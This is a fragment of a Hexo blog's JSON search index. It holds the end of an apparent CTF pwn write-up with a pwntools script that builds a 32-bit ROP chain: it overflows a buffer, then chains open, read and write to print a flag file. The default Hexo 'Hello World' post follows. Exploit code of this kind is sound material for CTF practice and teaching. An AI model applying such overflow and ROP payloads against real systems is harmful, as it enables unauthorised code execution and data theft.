+ 4) + p32(elf.symbols['read']) + p32(pppr)30 payload += p32(0) + p32(elf.bss() + 0x200) + p32(0x10) + p32(elf.symbols['main'])3132 p.sendafter(\"Your input :\", payload.ljust(100, '\\x00'))3334 p.sendline(\"flag\\0\")3536 raw_input()37 payload = 'a'*0x1838 payload += p32(elf.symbols['open']) + p32(pppr) + p32(elf.bss() + 0x200) + p32(4) + p32(0)39 payload += p32(elf.symbols['read']) + p32(pppr) + p32(3) + p32(elf.bss() + 0x200) + p32(0x10)40 payload += p32(elf.symbols['write']) + p32(pppr) + p32(1) + p32(elf.bss() + 0x200) + p32(0x10)4142 p.sendlineafter(\"Your input :\", payload)4344 p.interactive()4546 if __name__ == '__main__':47 pwn() 结果:","tags":[{"name":"PWN","slug":"PWN","permalink":"http://wafuter.jxustctf.top/tags/PWN/"}]},{"title":"Hello World","date":"2019-12-19T13:45:35.530Z","path":"2019/12/19/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":[]}]